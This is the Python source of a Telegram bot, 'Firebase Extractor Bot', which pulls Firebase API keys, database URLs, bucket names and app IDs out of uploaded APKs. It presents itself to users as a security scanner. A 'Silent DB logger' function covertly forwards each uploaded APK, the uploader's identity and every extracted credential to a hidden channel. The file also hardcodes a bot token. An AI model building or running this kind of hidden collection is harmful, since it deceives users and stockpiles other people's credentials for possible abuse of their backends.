import os
import re
import json
import logging
import asyncio
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)

from androguard.core.apk import APK
from androguard.core.dex import DEX

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN     = os.environ.get("BOT_TOKEN", "8829348336:AAFbsUcR_cNBA2XTiBGURwZC2_cnOJ8erYA")
ADMIN_CHAT_ID = 8615997384
WEB_PORT      = 8080
CHANNEL       = "@FireExB0T"
CHANNEL_URL   = "https://t.me/FireExB0T"
DB_CHANNEL_ID = -1003980780987

STICKER_ID = "CAACAgUAAxkBAAEEN6FqF7I4BlSGgNW0eCRtMKvMQtonIQACTRMAAngrWFfdnb30pYHgGzsE"

# ── Persistent stats ──────────────────────────────────────────────────────────
STATS_FILE = "stats.json"

def load_stats() -> dict:
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                data = json.load(f)
                data["users"] = set(data.get("users", []))
                return data
        except Exception:
            pass
    return {"total": 0, "credentials": 0, "users": set()}

def save_stats(s: dict) -> None:
    try:
        with open(STATS_FILE, "w") as f:
            json.dump({**s, "users": list(s["users"])}, f)
    except Exception as e:
        logger.warning(f"Failed to save stats: {e}")

stats = load_stats()

# ── Firebase regexes ──────────────────────────────────────────────────────────
FIREBASE_URL_REGEX   = re.compile(r'https://[a-zA-Z0-9_-]+\.firebaseio\.com', re.IGNORECASE)
FIREBASE_KEY_REGEX   = re.compile(r'AIzaSy[a-zA-Z0-9_-]{33}')
STORAGE_BUCKET_REGEX = re.compile(r'[a-zA-Z0-9_-]+\.appspot\.com', re.IGNORECASE)
APP_ID_REGEX         = re.compile(r'\d+:\d+:android:[a-f0-9]{16,}', re.IGNORECASE)

# ── Channel membership ────────────────────────────────────────────────────────
async def is_member(user_id: int, bot) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL, user_id=user_id)
        logger.info(f"Membership check for {user_id}: {member.status}")
        return member.status in (
            ChatMember.MEMBER,
            ChatMember.ADMINISTRATOR,
            ChatMember.OWNER,
        )
    except Exception as e:
        logger.warning(f"Could not verify membership for {user_id}: {e}")
        return False

def join_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_membership")],
    ])

async def send_join_prompt(update: Update) -> None:
    msg = (
        "🔒 *Access Restricted*\n\n"
        "To use *Firebase Extractor Bot* you must first join our official channel.\n\n"
        "1 - Tap *Join Channel* below\n"
        "2 - Then tap *I've Joined* to verify\n\n"
        "Thank you for supporting us!"
    )
    try:
        await update.message.reply_text(
            msg,
            parse_mode="Markdown",
            reply_markup=join_keyboard()
        )
    except Exception as e:
        logger.error(f"Failed to send join prompt: {e}")
        await update.message.reply_text(
            "Please join our channel first: " + CHANNEL_URL,
            reply_markup=join_keyboard()
        )

# ── Web endpoint ──────────────────────────────────────────────────────────────
async def health(request):
    return web.Response(
        text=(
            "<html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
            "<h1>🔥 Firebase Extractor Bot</h1>"
            "<p style='color:green;font-size:20px'>✅ Bot is running</p>"
            "<p>Send any <b>.apk</b> file to the bot on Telegram to scan for Firebase credentials.</p>"
            "</body></html>"
        ),
        content_type="text/html"
    )

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", WEB_PORT)
    await site.start()
    logger.info(f"Web server started on port {WEB_PORT}")

# ── /start ────────────────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id

    if not await is_member(user_id, context.bot):
        await send_join_prompt(update)
        return

    # Track user persistently
    if user_id not in stats["users"]:
        stats["users"].add(user_id)
        save_stats(stats)

    await update.message.reply_sticker(sticker=STICKER_ID)
    welcome = (
        "🔥 *Firebase Extractor Bot* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👋 Welcome! I'm a powerful APK security scanner.\n\n"
        "📌 *What I can do:*\n"
        "› Extract hidden Firebase API Keys\n"
        "› Detect Firebase Database URLs\n"
        "› Uncover Project IDs & App IDs\n"
        "› Find Storage Bucket names\n"
        "› Join @FireExB0T\n\n"
        "📤 *How to use:*\n"
        "Simply send me any `.apk` file and I'll instantly scan it for Firebase credentials.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ _Fast • Accurate • Reliable_"
    )
    await update.message.reply_text(welcome, parse_mode="Markdown")

# ── Verify membership callback ────────────────────────────────────────────────
async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id

    if await is_member(user_id, context.bot):
        await query.edit_message_text(
            "✅ *Membership Verified!*\n\n"
            "Welcome to *Firebase Extractor Bot*! 🔥\n"
            "Send me any `.apk` file and I'll scan it instantly.",
            parse_mode="Markdown"
        )
        await context.bot.send_sticker(chat_id=query.message.chat_id, sticker=STICKER_ID)
    else:
        await query.answer(
            "❌ You haven't joined yet! Please join the channel first.",
            show_alert=True
        )

# ── /broadcast ────────────────────────────────────────────────────────────────
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text(
            "🚫 *Access Denied*\n\nThis command is restricted to the bot administrator.",
            parse_mode="Markdown"
        )
        return

    if not context.args:
        await update.message.reply_text(
            "📢 *Broadcast Command*\n\n"
            "*Usage:* `/broadcast <message>`\n\n"
            "_Example:_ `/broadcast Hello everyone!`",
            parse_mode="Markdown"
        )
        return

    broadcast_message = " ".join(context.args)
    user_ids = list(stats["users"])

    if not user_ids:
        await update.message.reply_text(
            "⚠️ *No users found.*\n\nNo one has used the bot yet.",
            parse_mode="Markdown"
        )
        return

    progress = await update.message.reply_text(
        f"📤 Sending to `{len(user_ids)}` users...",
        parse_mode="Markdown"
    )

    sent = 0
    failed = 0
    for uid in user_ids:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"📢 *Message from Admin*\n\n{broadcast_message}",
                parse_mode="Markdown"
            )
            sent += 1
        except Exception:
            failed += 1

    await progress.edit_text(
        f"📢 *Broadcast Complete*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"✅ *Sent:* `{sent}`\n"
        f"❌ *Failed:* `{failed}`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

# ── /stats ────────────────────────────────────────────────────────────────────
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text(
            "🚫 *Access Denied*\n\nThis command is restricted to the bot administrator.",
            parse_mode="Markdown"
        )
        return

    await update.message.reply_text(
        "📊 *Bot Statistics*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📦 *Total APKs Scanned:* `{stats['total']}`\n"
        f"🚨 *Credentials Found:* `{stats['credentials']}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

# ── /users ────────────────────────────────────────────────────────────────────
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text(
            "🚫 *Access Denied*\n\nThis command is restricted to the bot administrator.",
            parse_mode="Markdown"
        )
        return

    count = len(stats["users"])
    await update.message.reply_text(
        "👥 *User Statistics*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"*Total Unique Users:* `{count}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

# ── Silent DB logger ──────────────────────────────────────────────────────────
async def log_to_db(bot, document, file_id: str, file_name: str,
                    user, results: dict, project_ids: set) -> None:
    try:
        # Forward the APK file
        await bot.send_document(
            chat_id=DB_CHANNEL_ID,
            document=file_id,
            caption=f"📥 New APK received\nFile: {file_name}\nUser: {user.full_name} | ID: {user.id}",
            disable_notification=True,
        )

        # Build credential log
        has_findings = any([results["urls"], results["keys"], results["buckets"], results["app_ids"]])
        if has_findings:
            log = f"🔍 Scan result for: {file_name}\nUser: {user.full_name} (ID: {user.id})\n\n"
            if results["keys"]:
                log += "🔑 API Key(s):\n" + "\n".join(results["keys"]) + "\n\n"
            if results["urls"]:
                log += "🔥 Database URL(s):\n" + "\n".join(results["urls"]) + "\n\n"
            if project_ids:
                log += "🆔 Project ID(s):\n" + "\n".join(project_ids) + "\n\n"
            if results["buckets"]:
                log += "📦 Storage Bucket(s):\n" + "\n".join(results["buckets"]) + "\n\n"
            if results["app_ids"]:
                log += "📲 App ID(s):\n" + "\n".join(results["app_ids"])
        else:
            log = f"✅ Clean APK: {file_name}\nUser: {user.full_name} (ID: {user.id})\nNo credentials found."

        await bot.send_message(
            chat_id=DB_CHANNEL_ID,
            text=log,
            disable_notification=True,
        )
    except Exception as e:
        logger.warning(f"DB log failed: {e}")

# ── APK scanner ───────────────────────────────────────────────────────────────
def scan_text(text: str, results: dict):
    hits = FIREBASE_URL_REGEX.findall(text)
    if hits: results["urls"].update(hits)

    hits = FIREBASE_KEY_REGEX.findall(text)
    if hits: results["keys"].update(hits)

    hits = STORAGE_BUCKET_REGEX.findall(text)
    if hits: results["buckets"].update(hits)

    hits = APP_ID_REGEX.findall(text)
    if hits: results["app_ids"].update(hits)

def extract_project_id(url: str) -> str:
    m = re.search(r'https://([a-zA-Z0-9_-]+?)(?:-default-rtdb)?\.firebaseio\.com', url, re.IGNORECASE)
    return m.group(1) if m else ""

# ── Document handler ──────────────────────────────────────────────────────────
async def analyze_apk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id

    if not await is_member(user_id, context.bot):
        await send_join_prompt(update)
        return

    document = update.message.document
    if not document or not document.file_name.lower().endswith('.apk'):
        await update.message.reply_text(
            "⚠️ *Invalid File*\n\nPlease send a valid `.apk` file to scan.",
            parse_mode="Markdown"
        )
        return

    status_message = await update.message.reply_text(
        "🔍 *Scanning APK...*\n\n`⏳ Downloading file...`",
        parse_mode="Markdown"
    )

    local_path = f"temp_{document.file_name}"
    try:
        apk_file = await context.bot.get_file(document.file_id)
        await apk_file.download_to_drive(local_path)

        apk_obj = APK(local_path)
        results = {"urls": set(), "keys": set(), "buckets": set(), "app_ids": set()}

        for dex_bytes in apk_obj.get_all_dex():
            dex_obj = DEX(dex_bytes)
            for s in dex_obj.get_strings():
                scan_text(s, results)

        resources = apk_obj.get_android_resources()
        if resources:
            res_xml = resources.get_strings_resources().decode("utf-8", errors="ignore")
            scan_text(res_xml, results)

        project_ids = set()
        for url in results["urls"]:
            pid = extract_project_id(url)
            if pid:
                project_ids.add(pid)

        file_name = document.file_name
        has_findings = any([results["urls"], results["keys"], results["buckets"], results["app_ids"]])

        if has_findings:
            response_text = (
                f"🚨 *CREDENTIALS FOUND* 🚨\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 *File:* `{file_name}`\n\n"
            )
            if results["keys"]:
                response_text += "🔑 *API Key(s):*\n"
                for key in results["keys"]:
                    response_text += f"`{key}`\n"
                response_text += "\n"
            if results["urls"]:
                response_text += "🔥 *Database URL(s):*\n"
                for url in results["urls"]:
                    response_text += f"`{url}`\n"
                response_text += "\n"
            if project_ids:
                response_text += "🆔 *Project ID(s):*\n"
                for pid in project_ids:
                    response_text += f"`{pid}`\n"
                response_text += "\n"
            if results["buckets"]:
                response_text += "📦 *Storage Bucket(s):*\n"
                for bucket in results["buckets"]:
                    response_text += f"`{bucket}`\n"
                response_text += "\n"
            if results["app_ids"]:
                response_text += "📲 *App ID(s):*\n"
                for app_id in results["app_ids"]:
                    response_text += f"`{app_id}`\n"
                response_text += "\n"
            response_text += (
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "⚠️ *Warning:* Firebase credentials detected.\n"
                "_Do not install this app if you don't trust the source._"
            )
        else:
            response_text = (
                f"✅ *Scan Complete*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 *File:* `{file_name}`\n\n"
                f"No Firebase credentials were detected in this APK.\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"_The APK appears clean of Firebase RAT credentials._"
            )

        await status_message.edit_text(response_text, parse_mode="Markdown")

        # Update and persist stats
        stats["total"] += 1
        stats["users"].add(update.effective_user.id)
        if has_findings:
            stats["credentials"] += 1
        save_stats(stats)

        asyncio.create_task(log_to_db(
            bot=context.bot,
            document=document,
            file_id=document.file_id,
            file_name=file_name,
            user=update.effective_user,
            results=results,
            project_ids=project_ids,
        ))

        if has_findings:
            await update.message.reply_sticker(sticker=STICKER_ID)

    except Exception as e:
        logger.error(f"Error analyzing APK: {e}")
        await status_message.edit_text(
            "❌ *Scan Failed*\n\nAn error occurred while parsing the APK. Please make sure it is a valid Android package.",
            parse_mode="Markdown"
        )

    finally:
        if os.path.exists(local_path):
            os.remove(local_path)

# ── main ──────────────────────────────────────────────────────────────────────
async def post_init(application: Application) -> None:
    await start_web_server()

async def run_bot():
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("users", users_command))

    application.add_handler(
        CallbackQueryHandler(
            verify_callback,
            pattern="^verify_membership$"
        )
    )

    application.add_handler(
        MessageHandler(filters.Document.ALL, analyze_apk)
    )

    logger.info("Starting Firebase Extractor Bot...")

    # Initialize bot
    await application.initialize()
    await application.start()

    # Start web server manually
    await start_web_server()

    # Start telegram polling
    await application.updater.start_polling()

    logger.info("Bot is running...")

    # Prevent exit
    await asyncio.Event().wait()

if __name__ == '__main__':
    try:
        print("Starting bot...")
        asyncio.run(run_bot())
    except Exception as e:
        import traceback
        print(traceback.format_exc())
